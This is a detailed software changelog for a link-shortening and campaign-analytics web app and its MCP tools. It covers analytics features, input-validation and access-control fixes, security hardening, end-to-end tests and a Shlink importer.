- **Where to look:** `DEPLOYMENT.md` § Error alerting has its metric filter and a query, and § What the web app is
  used for has the dogfood's usage queries over the request lines.

### Fixed — a NUL character in a request is a 400 or a 422, not a 500
- **PostgreSQL can't hold a NUL character (U+0000) in text,** while SQLite, which the tests run on, can. So every
  request carrying one answered 500 in production, including:
  - the short-link host's own `/%00`, which anyone could send;
  - the links' search, and `/urls/{short_code}`;
  - a link's title or URL.
- **A NUL in the path or the query is a 400,** before any route sees it. That includes the short-link host, since
  no link has one.
- **A NUL in a JSON body is a 422** in FastAPI's shape, saying where it is. The body is parsed for it only when its
  bytes hold a NUL or its escape, so other requests pay for a byte search, not a second parse.
- **A safety net** answers psycopg2's refusal of a NUL with a 422, for anything the first two don't see.
- **Headers don't need a check.** uvicorn's parsers refuse a NUL in one with a 400 of their own. A huge header is
  stored whole: user agents and referrers are text with no limit.

### Added — the manual: making a campaign, and reading your analytics (7.1)
- **"Make a campaign from a CSV"**: what the CSV needs; that each person's row reaches the destination as
  parameters, so keep to what you'd share that way; the wizard's steps; exporting the links for a mail merge, with
  each person's tracking image; and what to do when a row doesn't fit.
- **"Read your analytics"**: what counts as a click and as an email open; a link's page, tab by tab, with its CSV;
  a campaign's page, with its people-first numbers and its recipients.
- **Where to find them:** Help in the account menu; "How to read this" in a link's and a campaign's Analytics, to
  that page's section; "How campaigns work" in the wizard's CSV step, in a new tab so the wizard keeps what's typed.
- `tests/manual-links.test.mjs` fails on a link inside the manual that goes nowhere, heading included, and the
  manual joins the end-to-end render and axe checks.

### Added — a welcome for new members (the dogfood, 5.6)
- **For an account's first 14 days, the dashboard opens with a welcome card**, until it's dismissed on that browser:
  - links belong to the organization, by its name, so the team sees them; personal ones on purpose;
  - where to start: paste a link below; track a campaign from a CSV, with how campaigns work (the manual); connect
    Claude.
- **Why:** links are the organization's (3.14), so a new member's list shows the team's links and the "first link"
  empty state never greets them. The old card needed a `?welcome=` that nothing set since the register page went
  (3.13).

### Fixed — the short-link host's icon, and a strict CSP on the crawler preview
- **`/favicon.ico` answers with a 204,** cached a week. Browsers ask every host for its icon. On the short-link host
  the request reached `/{short_code}`, and was an orphan visit in "Typos & broken links" each time. `robots.txt`
  answers as it did.
- **A social crawler's preview page comes with a strict Content-Security-Policy,** like the unavailable-link page:
  nothing but its one style block, allowed by hash.
  - Its one inline style attribute became a class, since a hash doesn't cover attributes.
  - It loads no image: the OG image is a meta tag the crawler fetches itself.
  - Its refresh to the destination still works.

### Added — a page for someone whose short link doesn't lead anywhere
- **People got raw JSON.** Opening a short link with no such code, one not live yet, one expired or one with its
  visit limit used up showed `{"detail": …}` in the browser. Those people are Griddo's clients and prospects.
- **A browser now gets a page, with the same status.** That's 404, or 410 for an expired or used-up link, with
  copy for each: `server/templates/link_unavailable.html`.
  - A link not live yet shows the no-such-link page, as its 404 always was, so a scheduled link isn't revealed.
  - The page shows nothing from the request, not even the code.
  - It comes with a strict Content-Security-Policy: nothing but its one style block, allowed by hash. It's
    `no-store`, `noindex` and `nosniff`.
- **Everything else gets the JSON it always had.** A page only when the Accept header prefers `text/html` to
  `application/json`; `*/*` (curl, fetch), JSON or no header get the JSON. Both carry `Vary: Accept`.
- **`INVALID_SHORT_URL_REDIRECT`**, Shlink's setting, sends everyone elsewhere instead, in all four cases:
  - a 302 that isn't cached;
  - an unknown code is still an orphan visit first;
  - off by default, and an absolute http(s) URL or the app won't start.

### Fixed — a link's clicks by country count the same clicks as its breakdown
- **`GET /api/v1/analytics/urls/{short_code}/geo`,** the MCP's `get_url_geo_stats`, left out every click with no
  country. It also counted the last N × 24 hours in UTC, where the rest of the analytics count the viewer's local
  days. So its total could differ from the link's breakdown for the same days.
- **Now it counts as the breakdown does:** the period's local days, with "Unknown" for a click with no country. Its
  total is the breakdown's. The response keeps its shape, `period_days` is the days counted, and the CSV counts
  "Unknown" too.
- **It takes a period like the other routes:** `period`, or `from` and `to`, and `tz`. `days` still works, as the
  old `period`:
  - past 731 days, the longest a period is, it counts the last 731, since the cap wins;
  - with `period` or `from`/`to` too, it's a 422.

### Fixed — the Analytics page's Pro card, and its typos' window
- **"Go deeper" no longer says a link's own views are coming with Pro.** Each link's page already has the last 30
  or 90 days, dates you pick, and its visits as a CSV, free (paywall rule 1). The card says so, and points to Top
  links and Links. Only what isn't built is "Coming soon": longer ranges across all your links, and live stats.
- **"Typos & broken links" shows its window in its header, "Last 30 days"**, and says the range above doesn't
  change it. Under a range row reading "Last 7 days", it looked like a contradiction.

### Added — "Typos & broken links" suggests from every link, a page at a time
- **The analytics page grouped the newest 500 orphan visits itself,** and its "did you mean" looked only at the
  newest 100 links. Both now come from the API, over the last 30 days: every path tried, 10 at a time, with the
  links pager.
- **`GET /api/v1/analytics/orphan-visits/grouped`** groups the hits on unknown codes by the path tried. It takes a
  period like the other analytics routes, and pages its results.
  - Each path: how often it was tried, its first and last hit, and `did_you_mean`.
  - The most tried first, then the latest hit.
  - Hits on "/" aren't typos, so they aren't counted.
  - Never an IP, a user agent or a referrer.
- **"Did you mean" looks at every link you can see.** It suggests a link the path is one edit from: a character
  deleted, inserted or replaced, or two neighbours swapped. It also suggests the same code in capitals, where codes
  are lowercase.
  - Up to 3, the likeliest first.
  - One indexed lookup per path, and none for a path no code could be: longer than 20 characters, or with a
    character no code has, like a scanner's `/wp-login.php`.
  - Two edits would suggest unrelated links as codes grow in number, so it stops at one.
- **The MCP's `list_orphan_visits_grouped` uses the same grouping.** It no longer loads every row of its window, and
  each path gains `first_seen`, `last_seen` and `did_you_mean`. Its samples are unchanged, IPs included: that's a
  decision pending (`docs/PERSONAL_DATA.md`).

### Added — the pager's specimen (styleguide)
- **The pager under the links' and the campaigns' lists** (`components/ui/Pager.astro`, from #134) has a live
  specimen: 57 links, 20 a page, brought to each page by `renderPager`, as the lists do. In `/styleguide/` →
  Buttons, after Navigation. `design/DESIGN_SYSTEM.md` lists the component, and paging among its patterns.
- **The styleguide runs under the end-to-end tests' rules** (`e2e/styleguide.spec.ts`, which pages through the
  specimen): no CSP or Trusted Types violation, no uncaught error, nothing from another host.

### Fixed — the campaigns page shows every campaign, 20 at a time
- **It showed only the newest 100.** It asked for one page of 100, the most a page holds, and had no pager, so the
  101st campaign and older never showed. Their pages and links still worked, by address.
- **Now it shows 20 at a time, with the links page's pager.** That's Previous and Next, "Showing 1–20 of N", and
  `?page=` in the address. It's the same component now (`components/ui/Pager.astro`) and the same `?page=` handling.
  The page also sends at most 20 summary requests at a time, where it sent up to 100 at once.
- **A campaign link's page names its campaign, whichever it is.** It looked for it among those newest 100, and
  said "a campaign" for an older one. The link now carries its campaign's name, **`campaign_name`**:
  - on `GET /api/v1/urls` and `GET /api/v1/urls/{short_code}`, and so in the MCP's `list_urls` and `get_url`;
  - it's a new field, `null` on other links, and nothing else changes;
  - the list loads its page's campaigns in one query, whatever its size.
- **Tests:**
  - the name on a campaign link, and none on the others;
  - the list's query count;
  - the pager's states;
  - an end-to-end test: of 21 campaigns, the first made is on page 2, and its link's page names it.

### Fixed — an absurd number in a request is a 422, not a 500
- **Six query parameters and two body fields took any integer.** A value past what the database or the date
  arithmetic holds answered 500, on PostgreSQL too:
  - `?skip=` on `/urls`, `/campaigns` and `/analytics/orphan-visits`, past 2^63;
  - `?page=` on a link's visits and a campaign's recipients, once the page times its size passes 2^63;
  - `?days=` on `/analytics/urls/{short_code}/geo`, at a billion. It also took 0 or a negative, for an empty answer;
  - `max_visits` on a link, and a redirect rule's `priority`, past 2^31.
- **Each now has bounds far past anything real** (`server/utils/bounds.py`). A value past them is a 422:
  - `skip` up to 1,000,000,000;
  - `page` up to 1,000,000;
  - `days` from 1 to 3660, ten years;
  - `max_visits` and `priority` up to what their column holds, 2^31 − 1. A priority may still be negative: a lower
    one runs first.
- **The MCP's curated tools advertise their bounds.** Their numbers were checked only once the tool ran. Now the
  tool's schema says so, and a value outside it is refused before the tool runs:
  - `get_url_analytics_summary`'s `days` (1–90);
  - `list_orphan_visits_grouped`'s `since_days` (1–365) and `limit_groups` (1–200);
  - `add_redirect_rule`'s `priority`.
- **`tests/test_bounded_numbers.py` keeps it so.** It reads the OpenAPI document and the MCP's tools, and fails on an
  integer with no maximum or no minimum. That's a parameter, a body field or a tool argument. It also fails on one
  that may be negative without a reason in its allowlist.
- **The links page's `?page=` stays within the API's bounds.** A fraction, or a page past a billion rows, was sent
  as is, and the list failed to load. Now it's page 1, as a page past the last already was.

### Added — end-to-end tests (Phase 6.1)
- **Playwright drives the production build of the frontend in Chromium**, against the real API on its own
  PostgreSQL, on every push and pull request (the `e2e` job of `test.yml`). Locally: `npm run e2e` in
  `frontend/`, with a throwaway database (`docs/TESTING.md`).
- **Signing in goes through the real Google flow**, with the pytest suite's fake Google in place of Google:
  `tests/e2e/app.py`. It starts only with `E2E=1` on a local database, and the image never copies `tests/`
  (a test reads the dockerfile).
- **Every test fails** on a Content-Security-Policy or Trusted Types violation, an uncaught error in a page, a 5xx
  from the API, or a request to any other host.
- **The specs:**
  - signing in and out;
  - a link from the dashboard's list to its page: its all-time numbers, the tabs, the periods (a custom range
    refused, then applied) and the CSV of its visits;
  - a campaign from the wizard to who clicked: Clicked and each filter's count, a sort, the Clicked filter, two
    recipients' links copied at once, and the recipients' CSV;
  - Settings: the profile saved and the header's initial following it, and the tabs by keyboard;
  - a phone (390 px): a link's tabs, and a campaign's recipients sorted from "Sort by";
  - the public pages, and the 404 page for an unknown address.
- **Accessibility:** axe checks the landing, login, dashboard, link, campaign and Settings pages and the manual, on a
  desktop and on a phone (390 px, the menu dialog included). A moderate, serious or critical issue fails the test.

### Fixed — a long search, and the landing and login pages' contrast and landmarks
- **The recipients' search takes up to 200 characters**, as the API does. A longer paste got an error instead of
  results; the rest is now cut off as it's pasted.
- **The times in the login page's example feed are readable**: over 6:1 against its dark panel, from about 3:1.
- **The landing page has a main landmark, and the login page's logo and small print sit in its header and
  footer**, so a screen reader can go straight to each part of either page.

### Removed — the `IS_LAMBDA` setting
- **A leftover of the Lambda deploy**, which the ECS deploy never sets. It made short URLs `https://DEFAULT_DOMAIN`
  even with `DEFAULT_DOMAIN=localhost`. A non-local `DEFAULT_DOMAIN` already does that, so short URLs don't change.
  An `IS_LAMBDA` left in an environment is now ignored.

### Added — every environment variable, in one reference (ROADMAP 7.1)
- **`docs/ENVIRONMENT.md`** lists every variable Shurly reads, with its default and what it does. That's the
  backend's settings, what the backend, its tools and its tests read directly, and what the frontend's build reads.
  It has defaults only, never a production value.
- **`tests/test_environment_reference.py` keeps it true.** It fails when:
  - a setting has no row, or another default than its row;
  - a variable read anywhere (`os.getenv`, `os.environ`, or `PUBLIC_*` in the frontend) has no row;
  - a row names nothing.

### Security — a crawler's preview of a campaign link no longer carries its recipient's data
- **When a recipient shared their campaign link, the social network's crawler got their data.** The preview page
  that `GET /{short_code}` gives crawlers (LinkedIn, WhatsApp, Slack…) sent them on to the personalized destination,
  whose query holds the recipient's CSV row (`user_data`), their name or email included.
- **The preview's refresh target is now the destination without that row.** It's the target the redirect rules
  pick, plus what the shared address itself forwards, which is already public. No meta tag ever carried the row.
- **People still get their personalized redirect, unchanged.** A forwarded parameter still wins a clash with the
  row, as before.
- Found by the personal-data audit (`docs/PERSONAL_DATA.md`, finding 1).

### Security — who sees people's data, route by route
- **`docs/PERSONAL_DATA.md`** lists every route and MCP tool: what people's data it returns (recipients' CSV rows and
  activity, visits, addresses, accounts), who sees it, and the guard in the code that decides.
- **`tests/test_personal_data_inventory.py` keeps it true.** It fails when:
  - a route or tool has no row;
  - a row's guard isn't in its code;
  - the MCP column isn't the tools;
  - people's data goes to anyone without "(by design)".

  So a new route can't widen who sees people's data without saying so in the same PR.
- **`tests/test_personal_data_access.py` checks it at runtime.** It covers every GET that returns recipients' rows,
  their activity, or visits (20 routes, read from the table):
  - an outsider from another organization gets a 404, and never sees the data in a list;
  - a plain member gets it;
  - a personal campaign stays its creator's.
- **One lookup for a link and one for a campaign** (`visible_url_or_404`, `visible_campaign_or_404`, in
  `server/utils/access.py`). Each had two copies, in the link and campaign routes and in the analytics. The rules are
  the same, and every route answers as it did.
- **Two questions for the user are marked "decision pending":** a campaign link's visits one by one, and orphan
  visits' IPs.
- **One finding, not fixed yet:** a crawler's preview of a campaign link carries its recipient's data. See the doc.

### Added — a campaign's analytics (Phase 3.17)
- **The campaign page's header numbers are all-time and about people** (`/totals`):
  - **Clicked:** the recipients who clicked their link, as a share of all of them;
  - **Opened:** the recipients who opened the email (its tracking image), with a note that Apple Mail's automatic
    opens count too;
  - **Recipients** and **Clicks**.

  "Opened" used to mean "clicked their link". It's "Clicked" now, here and on the campaigns list.
- **The link page's Analytics section, over all the campaign's links:** the period, By time, By context and By
  location. There's no list of visits, on purpose.
- **Recipients, all time, a page at a time:**
  - search; All, Clicked, Opened or Not yet, each with its count;
  - sorted by clicks, opens, the last click or the link;
  - ticks that survive a page change, for "Copy their links";
  - Export CSV of every recipient that matches (`/recipients.csv`). It replaces the "Download click report" menu
    item.
- "Unique visitors" and "Most engaged" are gone. Sorted by clicks, the recipients put the most engaged first.
- The Analytics section is one component for both pages (`AnalyticsSection.astro`, `analytics-section.ts`).

### Added — the API for a campaign's analytics (Phase 3.17)
- **Five routes under `/api/v1/analytics/campaigns/{campaign_id}/`, for the campaign's page.** The contract is in
  ROADMAP 3.17.1:
  - **`/totals`**: the header's all-time numbers: recipients, clicks, email opens, **Clicked** and **Opened**
    (the recipients with at least one click, or at least one pixel open; one can be both), the click and open
    rates, countries, and the last click.
  - **`/timeseries`** and **`/breakdown`**: a link's (Phase 3.16), over all the campaign's links, with the same
    period, kinds and labels.
  - **`/recipients`**: all time, for following up with people. Each recipient has their link, CSV row, clicks,
    opens, first and last click and last open.
    - A filter: all, Clicked, Opened or none.
    - A search over their CSV values and code.
    - A sort, and 50 a page.
    - `counts`: how many each filter gives for the search.

    Searching, filtering, sorting and paging all happen in the database.
  - **`/recipients.csv`**: the same, every row, spreadsheet-safe. It isn't an MCP tool.
- **They answer for exactly the campaigns `/users` answers for:** the organization's, whatever the role, and your
  own. `/summary`, `/users` and the new routes now decide with one function.
- **The open rate overcounts, as opens do:** Apple Mail Privacy Protection loads the pixel when a message arrives,
  read or not.
- **The MCP gains `get_campaign_totals`, `get_campaign_timeseries`, `get_campaign_breakdown` and
  `list_campaign_recipients`.** `/summary` and `/users` are unchanged.

### Added — a campaign's recipients table (styleguide, Phase 3.17)
- **`recipientsView()`** (`frontend/src/utils/recipients.ts`), for the campaign page's Recipients: a table on
  wide screens (the CSV's columns, the link with Copy and QR, clicks, opens, the last click) and stacked rows
  on phones, with Clicked and Opened badges. Clicks, opens, the last click and the link sort from their
  headers (`aria-sort`); phones get a **Sort by** select. Each recipient's two checkboxes stay alike.
- The logic in `recipients-view.ts` (no imports, tested): sorting, the `/recipients` query, a recipient's name
  and line, the count, and why the list is empty. In `/styleguide/` → Data viz.

### Fixed — a link's last click is a click, and an unknown address isn't a visitor
- **A link's `last_click_at` moved on every visit the redirect logged, bots included.** So a link only bots had
  visited showed "Last … ago" in the dashboard next to no clicks, instead of "No clicks yet". It moves on a click
  now, as the analytics' `/totals` counts one: not a bot's visit, an email open, a crawler's preview or a
  `?nostat` hit. The Shlink import counted Shlink's potential bots the same way; it doesn't anymore.
- **Migration `0010` repairs what's stored:** each link's latest click, or nothing. Data only, in two
  statements. During the rollout, the previous release can still set a bot's time. So `users.api_key`'s drop
  takes `0014` (`0011` is a visit's city, 8.4; `0012` the organization's logo, 3.14.4; `0013` longer short
  codes, 8.4).
- **Unique visitors don't count an unknown address.** Every visit imported from Shlink has ip "unknown" (it
  exposes none), and so does a visit whose address Shurly couldn't read. They made one extra "visitor" in the
  overview, a campaign's summary, top performers and users, and the MCP's link summary. So unique-visitor counts
  now cover the cutover onward, as the importer's README says.

### Added — a link's analytics, as on Shlink's link page (Phase 3.16)
- **The link page has an Analytics section for a period:** 7, 30 or 90 days, or a custom range. The period
  stays in the address and the tab in its hash, so a reload or a shared link keeps both.
  - **By time:** clicks or email opens by day, week or month, and by hour of the day and day of the week.
  - **By context:** operating systems, browsers and devices as donuts, and referrers.
  - **By location:** countries, with Unknown last.
  - **Visits:** each visit, newest first: clicks, email opens, bots or all. A table on wide screens, stacked
    rows on phones, 20 a page.
  - **Export CSV:** every visit of the period (`/visits.csv`), spreadsheet-safe.
- **The header's numbers are all-time** (`/totals`): clicks, email opens, countries and the last click. The
  "Last 7 days" and "Last 8 weeks" cards gave way to the period.
- A period with email opens and no clicks shows its opens first. Opens carry a note: Apple Mail loads an
  email's images on its own.
- A column chart's labels thin out when its columns get narrow, and the chart takes one tab stop: the arrow
  keys move between its columns.
- `npm run build` fails if development-only code reaches a build (`scripts/check-dev-only.mjs`): the
  analytics' mock, which `&mock` loads under `astro dev` only.

### Added — a donut chart, and "Show all" for bar lists (styleguide)
- **`donutChart()`** (`frontend/src/utils/charts.ts`, geometry in `donut.ts`), for the link's analytics by
  context: shares of one total in one hue, four blues and a grey tail ("Other" past five), the total in
  the hole, a legend with a **Show numbers** switch (`bindShowNumbers()`), and a table twin with shares
  (`donutTable()`). The legend is the list screen readers read, numbers included; its keys take focus.
  In `/styleguide/` → Data viz.
- **`barList()`** takes a `limit`: the rest wait behind **Show all N**. A cut label shows in full on hover,
  and each value names its unit for screen readers.
- **`dataTable()`** can add a share column: whole percents that add up to 100.

### Added — the API for a link's analytics (Phase 3.16)
- **Five new routes under `/api/v1/analytics/urls/{short_code}/`, for the link's page.** The contract is in
  ROADMAP 3.16.1:
  - **`/totals`**: the header's all-time numbers: clicks, email opens, the countries clicks came from, and the
    last click.
  - **`/timeseries`**: clicks and opens side by side, per local day, ISO week or month, clipped to the period.
    Also per hour of day and per day of week.
  - **`/breakdown`**: by OS and browser family, device, referrer host and country. Each value has its count
    and share, with "Unknown" and "Direct" (no referrer) as values.
  - **`/visits`**: the visits, newest first, a page at a time (20 by default, up to 100), with a total for
    "1–20 of N". Each shows its local time, kind, country, browser, OS, device and referrer host. **Never an
    IP, a user agent or a full referrer.**
  - **`/visits.csv`**: every visit of the period, streamed: the list's columns plus the raw user agent, still
    no IP, every cell spreadsheet-safe.
- **They take a period:** `period=N`, the last N local days with today (30 by default), or `from` and `to`, at
  most 731 days and ending today at the latest. With `tz` and `domain`, as the others.
- **Every visit is one kind: a click, an email open (a pixel hit that isn't a bot's) or a bot's.**
  `/breakdown`, `/visits` and `/visits.csv` take `type=clicks|opens|bots|all` (the CSV defaults to `all`). A
  click is what every other count calls one.
- **Opens overcount:** Apple Mail Privacy Protection loads the pixel when a message arrives, read or not.
- **User agents are parsed when the numbers are asked for, not stored.** So the labels always follow the parser.
- **The MCP gains `get_url_totals`, `get_url_timeseries`, `get_url_breakdown` and `list_url_visits`.** The
  CSV isn't a tool: an assistant pages through the list instead of pulling every visit into its context.
  `/daily`, `/weekly` and `/geo` are unchanged.

### Security — `deploy_ecs.sh` no longer overwrites production's settings
- **The script only creates the ECS service now.** Run against the live service, its update path sent the
  container it builds, whose environment holds 20 variables, and so dropped every setting added on the service
  since: sign in with Google, the MCP's OAuth, `FRONTEND_URL`, and whatever gets added there later.
- Once the service exists it stops before building anything, and says where to go: a merge to `main` for an
  image (the deploy workflow changes only the image), the live service for a setting (DEPLOYMENT.md § Settings).
  A failed lookup stops it too. `tests/test_deploy_ecs_script.py` runs it against stubbed `aws` and `docker`.
- The playbook's "Deploy from local", and its JWT and database password rotations, no longer re-run it.
- Docs: in production the Google sign-in's code exchange is same-origin, so `CORS_ORIGINS` needs no entry for
  it (DEPLOYMENT.md § Settings, `docs/setup_google_app.md` step 7).

### Removed — the legacy `/api/v1/stats/*` routes
- **`GET /api/v1/stats/day/{surl}`, `…/week/{surl}`, `…/world/{surl}`, `…/main` and `…/next/{surl}` answer `404`.**
  They were mounted without authentication, and broken since Phase 1.4: they queried columns that don't exist
  (`urls.short_url`, `visits.created_at`), so every call was a `500`. No client can depend on them, since no call
  ever succeeded. `/api/v1/analytics/*` serves these numbers, for the links the caller can see.
- The MCP's rule that kept them out of its tools is gone with them.

### Fixed — the last `shurl.griddo.io` defaults, and the docs of rule 12
- **The link previews' fetcher names a host that exists.** Its User-Agent pointed at `https://shurl.griddo.io`,
  which never existed. It's `https://shurly.griddo.io` now (`server/utils/opengraph.py`).
- **CORS lists no other origin by default**: `.env.production.example` and `deploy_ecs.sh` listed
  `https://shurl.griddo.io`, and now say `'[]'`, since the frontend shares the API's host (DEPLOYMENT.md § CORS).
  `deploy_ecs.sh` no longer calls `CORS_ORIGINS` required, as it has a default. Production keeps its own value:
  the GitHub deploy changes only the image. A test loads the template and checks its value.
- The playbook, the rule-sync README and DEPLOYMENT.md show both hosts on ALB rule 12 (`shurly.griddo.io` and
  `s.griddo.io`) and the health check on `shurly.griddo.io`. DEPLOYMENT.md says the image is built for amd64 and
  arm64 (Fargate runs amd64), not for arm64 alone.

### Fixed — a link's click limit counts clicks only
- **The click limit (`max_visits`) counted every visit, email opens through the tracking pixel and bot hits
  included.** So a link could answer 410 Gone while its page still showed clicks left ("3 of 5 clicks used").
  It counts the link's `click_count` now: one definition for the limit, the link page and the stats.
- **Shlink's imported visits count the same way** (`--visits`): the clicks do, the bots and pixel opens don't.
  Shlink counted every visit, so a link it had capped can have clicks left in Shurly.

### Added — a visit's country (Phase 8.4)
- **Visits record their country**, as an ISO 3166-1 alpha-2 code, from DB-IP's IP to Country Lite database
  (CC BY 4.0, no account). It had been null for every visit Shurly recorded.
  - The lookup is in process, against a memory-mapped file, with no network call on the redirect path.
  - It uses the address that's stored: the anonymized one when `ANONYMIZE_REMOTE_ADDR` is on. Only the country is
    kept.
  - Without the database, visits simply have no country, and the app logs `geo.database_missing` once.
- **The image build fetches the database** (`scripts/fetch_geoip.py`): this month's or last month's, installed
  only if it places 8.8.8.8 in the US. A failed fetch doesn't fail the build: the deploy job warns on the run's page.
  `GEOIP_DATABASE` names the file; empty turns lookups off.
- **The link page shows country names**, from the browser (`Intl.DisplayNames`), with "Countries by DB-IP".
- **The Shlink import stores country codes too** (`visitLocation.countryCode`), since providers name some countries
  differently. The geo CSV and the MCP's summary carry codes.

### Security — an API key can't change the password
- **`POST /api/v1/auth/change-password` took an API key.** So a leaked key was enough to guess the account's
  password there, where the login's limit on failed attempts doesn't apply, and a right guess replaced it. It
  takes a signed-in session now, like setting and removing a password (Phase 3.13.3): an API key gets a `403`,
  even with the current password.

### Security — every password check is limited, and an API key can't make a new one
- **A wrong current password counts as a failed login.** `POST /api/v1/auth/change-password` and
  `PUT /api/v1/auth/password` (with `current_password`) checked it without a limit. So a stolen session could guess
  the password for as long as it lived, then set one that outlives it.
  - A wrong one now counts with the login's failures for that account (`RATE_LIMIT_LOGIN_FAILURES_PER_ACCOUNT`,
    10 per 15 minutes), so guesses on any of the three add up. Over the limit, each answers `429` with
    `Retry-After`.
  - The right password never counts. As with the login, over the limit it waits for the window too. Signing in
    with Google stays open, and with it a new password without the old one.
- **`POST /api/v1/auth/api-key/generate` takes a signed-in session.** An API key could call it, so a leaked key
  could mint its own replacement, ending the owner's. It gets a `403` now. Revoking with a key still works: that
  gives nothing away.
- The API docs list the `429` of these endpoints, and the login's.

### Security — Trusted Types on every page (Phase 6.3)
- **Every page's policy now includes `require-trusted-types-for 'script'` and `trusted-types shurly-html`.**
  The DOM's HTML sinks (`innerHTML` and the like) take TrustedHTML only, from one policy.
- **That policy lives in `src/utils/html.ts`**, behind `setHTML` and `toElement`, and nowhere else can reach
  it. It lets through only markup built by the escaping `html` tag, and escapes anything else: a string, or
  an object that merely looks like `html`'s output.
- **A stray `el.innerHTML = '…'` now throws**, in the browsers that support Trusted Types. So does any
  other policy, or a second one. Other browsers ignore the directives and render as before.
- **The QR code's preview goes through `setHTML` too.** It was the last raw sink.
- **Checked before switching it on:** the built bundles, and the app page by page with Trusted Types enforced.
  The only sinks are ours; Astro and the libraries use none.
- **The build now fails** without the two directives, or when the policy allows `default`, `*` or
  `'allow-duplicates'`. `frontend/tests/no-raw-html.test.mjs` fails on a `createPolicy` outside `html.ts`.
- **It also fails unless exactly one built script chunk defines the policy.** None means the policy was
  lost. Two mean `html.ts` was bundled twice, and a page loading both would throw at the second
  `createPolicy`.

### Added — importing Shlink's links (Phase 8.4)
- **`python -m server.tools.shlink import <snapshot> <review.csv> --as <owner>`** imports every link the review
  keeps, with its exact code (never lowercased), its domain and its creation date, owned by the organization.
  `--dry-run` does it all and rolls back.
- **Mapped:** the destination, title, tags (`archive` adds `legacy`), validity window, visit cap, `crawlable`,
  query forwarding and redirect rules. A rule with a condition Shurly has no equivalent for (IP address,
  geolocation) is left out whole. `language en-US` becomes `en`. The report lists all of it.
- **It can run again.** An identical link is left alone. A link there with another destination, or one Shurly
  can't take (a code over 20 characters, one of its own paths, a destination that isn't http(s)), stops the import
  before anything is written, unless the review drops it.
- **`--visits` imports Shlink's visits** (decision A, 2026-09-28):
  - `ip` is "unknown", which tells them apart; unique-visitor counts cover the cutover onward only;
  - bots and the `/track` pixel come as Shlink flagged them;
  - a later snapshot adds only the newer visits.
- `server/tools/shlink/README.md` documents it. How it runs against production is still to be decided.

### Added — "Created by" names on links (Phase 3.12)
- **Link cards and the link page say who created it by name**, e.g. "Created by Ana García", with the email
  as a tooltip, as campaigns do. "You" stays "you", and someone without a name still shows their email.
- **Link responses keep `created_by_email` and gain `created_by_first_name` and `created_by_last_name`**,
  null without a profile. That covers creating a link (standard or custom), the list, the detail, an edit,
  and the MCP's link tools. The list, the busiest endpoint, loads every creator's profile in one query,
  whatever the page holds.

### Added — "Created by" names on campaigns (Phase 3.12)
- **Campaign cards and the campaign page say who created it by name**, e.g. "Created … by Ana García", with
  the email as a tooltip. "You" stays "you", and someone without a name still shows their email. Links
  follow once their responses change for 8.3.
  - **On phones, the card's "by …" takes its own line under the date.** It used to be cut off beside "View
    campaign". Wider screens keep one line.
- **Campaign responses keep `created_by_email` and gain `created_by_first_name` and
  `created_by_last_name`**, null without a profile. That covers creating a campaign, the list, the detail
  and the MCP's campaign tools. The list loads every creator's profile with the page: one query, not one
  per campaign.

### Added — a link is its code and its domain (Phase 8.3)
- **The routes that take a link's code take `?domain=`**: `/api/v1/urls/{short_code}` and its tags, previews and
  rules, and the link's daily, weekly and geo analytics. Once Shlink's links are imported, one code can name a
  link on the default domain and another on `go.griddo.io`. Until now the API answered with whichever it found
  first.
- **Without `?domain=`, the default domain's link answers**, then the other domains' by hostname. A link from
  before domains counts as the default domain's. So a bookmark of a link's page without a domain keeps working.
- **`?domain=` is read like a request's `Host`:** lowercase, without a port or a trailing dot
  (`normalize_hostname`). The redirect path now drops a trailing dot too: `go.griddo.io.` finds `go.griddo.io`
  instead of falling back to the default domain.
- **Each link says its `domain`**, and its `short_url` is built on that domain: in link responses, campaigns and
  their CSV export, the analytics overview, link previews, and the page a social crawler gets. `BASE_URL` still
  applies only to the default domain.
- **Bulk tagging takes `links: [{short_code, domain}]`.** A plain `short_codes` entry tags one link per code, by
  the same default rule.
- **The MCP's tools take `domain` too:** the generated ones from the API, plus `add_redirect_rule` and
  `get_url_analytics_summary`. The summary also names the domain that answered.
- **The dashboard passes the domain.** Links in the list and in the analytics carry it. The link page sends it with
  every call, and puts it in its address once the link has loaded. The list keys its cards and its selection by
  the link's id, not its code.

### Added — names in Settings → Organization (Phase 3.12)
- **Members and removed people show their name, with the email under it.** Someone without a name in
  their profile shows the email, as before.
- **Confirmations, toasts and labels use the name**, e.g. "Remove Ana García?" and "Ana García is now an
  admin". A dialog also names the account ("Their account is ana@griddo.io."), as two people can share a
  name.
- **`GET /api/v1/organization/members` and `/removed-members` gain `first_name` and `last_name`**, null
  without a profile. So do the role-change and ownership-transfer answers, and the MCP's
  `list_organization_members`. The order is unchanged.
- **The members list loads the users and their profiles with it:** two queries, not one per member, which it
  was for the users already.

### Fixed — a link's analytics count only its own visits
- **Daily, weekly and geo stats (and their CSVs) and the campaign timeline counted visits by code.** The same
  code can name links on two domains, as at the Phase 8 import, next to the test links on `s.griddo.io`. So one
  link's stats could include another's visits. They're keyed on the link now (`visits.url_id`).
- **The MCP's `get_url_analytics_summary` counted tracking-pixel hits as clicks with `include_bots`.** It
  follows the app's rule now: a pixel hit is an open, never a click.

### Changed — analytics days are the viewer's days
- **Link daily and weekly stats, the overview's recent activity and the campaign summary's timeline count
  days in the viewer's time zone.** That's their profile's zone, or UTC without one (as before).
  - `?tz=` counts in another zone: an IANA name, with the profile's rules, and a 422 otherwise. It changes
    how visits are grouped into days, never which visits count.
  - Each response says which zone it used: `timezone`.
  - A day runs from local midnight to local midnight, so a DST day lasts 23 or 25 hours.
- **Behaviour change for API consumers: the overview's `recent_clicks_7d` is now the last 7 calendar days,
  today included, where the viewer is.** It's the sum of `recent_activity`. It used to be a rolling 168
  hours, so it didn't match the chart next to it.
- **The MCP's `get_url_analytics_summary` counts its days the same way**, so the app and the MCP give the
  same numbers. It says its `timezone` too.
- **The charts' "Today" is today in that zone.** Without a time zone in the profile, a hint under the chart
  says the days are in UTC and links to Settings → Account.

### Fixed — the weekly stats count today
- **The 8 weeks of `GET /api/v1/analytics/urls/{code}/weekly` ended yesterday.** So today's clicks were in
  none of them, nor in the link page's "this week vs last". They end today now.
- **Tests on SQLite read every day as 0**, because SQL's `date()` returns a string there. That hid wrong
  counts. Days are now bounded by UTC instants, and the tests check exact counts.

### Added — a photo for your account (Phase 3.12)
- **Settings → Account → Profile has a photo.** Pick a file or drop one on it: JPEG, PNG or WebP, up to 10 MB.
  - Then place it in a crop dialog: drag or arrow keys to move it; wheel, pinch, slider or + and − to zoom.
  - The circle is always covered: zooming out stops when the photo's short side fills it, and it can't be
    dragged off.
  - "Remove" goes back to the initial. The header shows the photo too.
